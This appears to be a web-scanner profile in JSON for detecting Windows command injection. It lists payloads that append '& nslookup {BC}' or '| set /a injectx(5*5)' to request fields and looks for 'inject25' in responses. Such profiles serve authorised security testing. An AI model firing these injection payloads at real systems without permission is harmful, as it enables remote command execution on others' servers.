[{"Name":"command-injection-windows","Enabled":false,"Scanner":1,"Author":"@GochaOqradze","Payloads":["\u0026 nslookup {BC} \u0026","\u0027\u0026 nslookup {BC}\u0027","\"\u0026 nslookup {BC}\"","| nslookup {BC}","\u0027| nslookup {BC}\u0027","\"| nslookup {BC}\"","\u0026 set /a injectx(5*5) \u0026","\u0027\u0026 set /a injectx(5*5)\u0027","\"\u0026 set /a injectx(5*5)\"","| set /a injectx(5*5)","\u0027| set /a injectx(5*5)\u0027","\"| set /a injectx(5*5)\""],"Encoder":[],"UrlEncode":false,"CharsToUrlEncode":"","Grep":["true,Or,inject25"],"Tags":["rce","All"],"PayloadResponse":false,"NotResponse":false,"TimeOut":"","isTime":false,"contentLength":"","iscontentLength":false,"CaseSensitive":false,"ExcludeHTTP":false,"OnlyHTTP":false,"IsContentType":false,"ContentType":"","NegativeCT":false,"IsResponseCode":false,"ResponseCode":"","NegativeRC":false,"isurlextension":false,"NegativeUrlExtension":false,"MatchType":1,"RedirType":0,"MaxRedir":0,"payloadPosition":1,"payloadsFile":"","grepsFile":"","IssueName":"command-injection-windows","IssueSeverity":"High","IssueConfidence":"Certain","IssueDetail":"command-injection-windows","RemediationDetail":"","IssueBackground":"","RemediationBackground":"","Header":[],"VariationAttributes":[],"InsertionPointType":[32,36,1,2,6,5,64,0,3,4,127],"Scantype":0,"pathDiscovery":false}]